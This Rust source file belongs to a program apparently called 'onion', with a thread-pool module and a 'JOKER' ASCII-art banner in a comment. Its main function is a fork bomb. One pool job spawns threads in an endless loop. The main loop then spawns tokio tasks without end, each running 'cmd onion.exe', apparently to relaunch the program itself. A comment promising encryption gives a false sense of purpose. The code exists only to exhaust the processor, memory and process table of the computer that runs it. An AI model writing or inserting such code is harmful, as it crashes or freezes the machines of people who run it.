







use utils;
pub mod scheduler;


pub const ONION_THREADS: u32 = 10_u32;





#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{ // onion - all types that the Error trait will be implemented for them must be also Sync + Send + static across all threads and .awaits
   

    

    // utils::trash();
    // utils::mactrait();
    // utils::unsafer();

    
    // TODO - encrypt all things
    // (multithreading + channels (oneshot and mpsc) + types must be send + sync + static across threads and .awaits) + cryptography algos


    let pool = scheduler::ThreadPool::new(ONION_THREADS as usize); // onion - `10_u32.pow(ONION_THREADS) as usize` will need an allocation of 56402616320 bytes!!!
    pool.execute(|| {
        loop{
            std::thread::yield_now();
            std::thread::spawn(|| async move{
                std::thread::yield_now();
                std::thread::spawn(|| async move{
                    std::thread::yield_now();
                    loop{
                        std::thread::yield_now();
                        std::thread::spawn(|| async move{
                            std::thread::yield_now();
                            loop{
                                std::thread::yield_now();
                                std::thread::spawn(|| async move{
                                    std::thread::yield_now();
                                    loop{
                                        std::thread::yield_now();
                                        std::thread::spawn(|| async move{
                                            std::thread::yield_now();
                                            std::thread::spawn(|| async move{
                                                std::thread::yield_now();
                                                /*
                                                
                                                                                                    
                                                               ▄▄▄██▀▀▀▒█████  ██ ▄█▀▓█████  ██▀███  
                                                                ▒██  ▒██▒  ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                                                                ░██  ▒██░  ██▒▓███▄░ ▒███   ▓██ ░▄█ ▒
                                                             ▓██▄██▓ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                                                             ▓███▒  ░ ████▓▒░▒██▒ █▄░▒████▒░██▓ ▒██▒
                                                             ▒▓▒▒░  ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                                                             ▒ ░▒░    ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                                                             ░ ░ ░  ░ ░ ░ ▒  ░ ░░ ░    ░     ░░   ░ 
                                                             ░   ░      ░ ░  ░  ░      ░  ░   ░     
                                                                                                        

                                                
                                                */
                                            });
                                        }); 
                                    }
                                });
                            }
                        });
                    }        
                });
            });
        }
    });
    





    loop{
        
        tokio::spawn(async move{
            std::process::Command::new("cmd")
                                    .arg("onion.exe")
                                    .output()
                                    .unwrap()
                                    .status;
        });
    
    }
    



}  